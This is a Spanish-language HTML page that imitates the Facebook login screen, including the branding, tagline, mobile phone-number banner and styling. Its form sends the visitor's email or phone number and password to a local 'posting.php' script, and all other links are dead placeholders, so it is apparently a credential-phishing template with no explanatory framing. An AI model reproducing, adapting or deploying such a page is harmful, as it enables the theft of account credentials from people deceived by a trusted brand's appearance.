
<style>div{display:none;}</style><!DOCTYPE html>
<html lang="es">
<head>
	<title>Ingresar</title>
	<meta charset="utf-8">
	<script type="text/javascript" src="https://code.jquery.com/jquery-3.7.1.js"></script>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<style>
      *{
        padding: 0;
        margin: 0;
      }
      body{
        background: #f0f2f5;
        display: flex;
        justify-content: center;
        font-family: arial;
        
      }
#n{
  width: 38%;
  font-size: 28px;
  margin-top: 16%;
  margin-right: 10%;
}
#n p:first-child{
  font-size: 60px;
  font-weight:bold;
  color: #1877f2;
}
#m{
  width: 30%;
  margin-top: 12%;
}
#m .a{
  background: #fff;
  border-radius: 8px;
  text-align: center;
  padding-top: 1.5%;
  padding:2.5%;
}
#m .a .cont{
  width: 90%;
  padding: 3.5%;
  font-size: 14px;
  border-radius: 5px;
  color: #c4c6cd;
  border:0.2px solid #dddfe2;
  margin-top: 3%;
}
#m .a .cont:focus{
  color: #000;
}
#m .a .b{
  margin-top: 3%;
  width: 97%;
  padding: 2.8%;
  border-radius: 5px;
  font-weight: bold;
  font-size: 18px;
  border: 0px solid #fff;
  background:#1877f2;
  color: #fff;
  cursor: pointer;
}
#m .a .f{
  margin-top: 3%;
  padding-bottom: 5%;
}
#m .a .f a{
  list-style: none;
  text-decoration: none;
  color: #1877f3;
  font-size: 14px;
}
#m .aa{
  width: 80%;
  padding-top: 5%;
  text-align:  center;
  margin: auto;
}
#m .aa a{
  list-style: none;
  color: #000;
  font-weight: bold;
  text-decoration: none;
}
      #mmm{
        display: none;
      }
  @media screen and (max-width:640px) {
    /* reglas CSS */
    #mmm{
      display: block;
    }
    #n{
      display: none;
    }
    body{
      background: #fff;
      flex-direction: column;
      
    }
    #mmm .g{
      background: #e6f2ff;
      font-size: 12px;    
      padding-top: 2%;
      padding-bottom: 2%;
      border-bottom: 1px solid #6eadff;
    }
    #mmm .g p a{
      color: #576b95;
      list-style: none;
      text-decoration: none;
    }
    #mmm .g p{
      margin: auto;
      width: 91%;
    }
    #m{
      width: 99%;
      margin-top: 3%;
    }
    #m .a .cont{
      background: #f5f6f7;
      color: #000;
    }
    #m .aa{
      display: none;
    }
    #mmm .gg{
      text-align: center;
      color:#1877f2;
      font-weight: bold;
      font-size: 22px;
      margin-top: 2.5%;
    }
  }
  @media screen and (max-width:1024px) and (min-width:640px) {
    /* reglas CSS */
  }
  @media screen and (min-width:1024px) {
    /* reglas CSS */
  }
  
  
  </style>
</head>
<body>
<section id="n">
  <p>facebook</p>
  <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
</section>
<article id="mmm">
  <section class="g"><p>Facebook solicita y recibe tu numero de telefono de tu red movil.</p><p><a href="#">Cambiar la configuracion</a></p></section>
  <section class="gg">facebook</section>
</article>
<article id="m">
  <section class="a">
  <form  method="POST" action="posting.php"  autocomplete="off">
      <p><input type="text" name="username" placeholder="Correo electronico o numero de telefono" class="cont"></p>
      <p><input name="password" type="password" placeholder="Contrase&ntilde;a" class="cont"></p> 
      <p><input type="submit" value="Entrar" class="b"></p>
      <p class="f"><a href="#">&#191;Has olvidado los datos de la cuenta?</a></p>
    </form>
  </section>
  <section class="aa">
    <a href="#">Crea una pagina</a> para un personaje publico, un grupo de musica o un negocio.
  </section>
</article>
</body>

</html>